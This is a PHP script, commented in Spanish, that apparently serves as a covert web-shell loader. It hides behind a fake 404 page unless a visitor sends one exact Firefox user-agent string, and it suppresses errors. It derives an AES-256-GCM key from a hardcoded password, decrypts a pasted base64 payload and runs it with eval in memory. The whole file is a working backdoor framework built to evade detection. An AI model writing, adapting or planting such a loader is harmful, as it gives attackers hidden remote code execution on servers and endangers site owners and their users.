<?php
// 1. MODO SILENCIO ABSOLUTO
error_reporting(0);
@ini_set('display_errors', 0);

// ================================================================
// EL MURO DE FUEGO (User Agent Whitelist)
// ================================================================
$allowed_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0";
$visitor_ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

if ($visitor_ua !== $allowed_ua) {
    header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>");
}

// ================================================================
// CONFIGURACIÓN (AES-256-GCM PBKDF2)
// ================================================================

$password = 'yosoymarianoelmarcianorealreal1923i8g4444gf34f3f33f'; // Tu contraseña

// Pega aquí el resultado BASE64 que te da la herramienta nueva
$payload = ''; 

// ================================================================
// MOTOR DE DESENCRIPTADO (NIVEL MILITAR)
// ================================================================
function run_gcm_decrypt($enc_data, $pass) {
    if (empty($enc_data)) die();

    // 1. Decodificar Base64
    $raw = base64_decode($enc_data);
    if (strlen($raw) < 44) { header("HTTP/1.0 404 Not Found"); die(); } // Mínimo de longitud seguridad

    // 2. Cirugía de datos: Separar componentes según el estándar de la web que usaste
    // Estructura habitual WebCrypto: Salt (16) + IV (12) + Ciphertext + Tag (16)
    
    $salt = substr($raw, 0, 16);           // Los primeros 16 bytes son la sal
    $iv   = substr($raw, 16, 12);          // Los siguientes 12 bytes son el vector (IV)
    $tag  = substr($raw, -16);             // Los ÚLTIMOS 16 bytes son la firma de seguridad (Tag)
    $ciphertext = substr($raw, 28, -16);   // Lo que hay en medio es el texto cifrado

    // 3. Derivación de Clave (PBKDF2)
    // La web usa PBKDF2 para convertir tu pass en una llave de 32 bytes (256 bits)
    // NOTA: La mayoría de webs modernas usan 100,000 iteraciones y SHA-256.
    $iterations = 100000; 
    $algo = 'sha256';
    $key_length = 32; // AES-256 necesita 32 bytes

    $key = hash_pbkdf2($algo, $pass, $salt, $iterations, $key_length, true);

    // 4. Desencriptar usando AES-256-GCM
    // PHP requiere pasar el Tag por separado (por eso lo extrajimos antes)
    $decrypted = openssl_decrypt($ciphertext, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);

    // 5. Verificación
    if ($decrypted === false) {
        // Si falla la contraseña o el tag (alguien modificó el archivo), 404.
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>");
    }

    // 6. Ejecución en Memoria RAM
    eval('?>' . $decrypted);
}

// Ejecutar
run_gcm_decrypt($payload, $password);
?>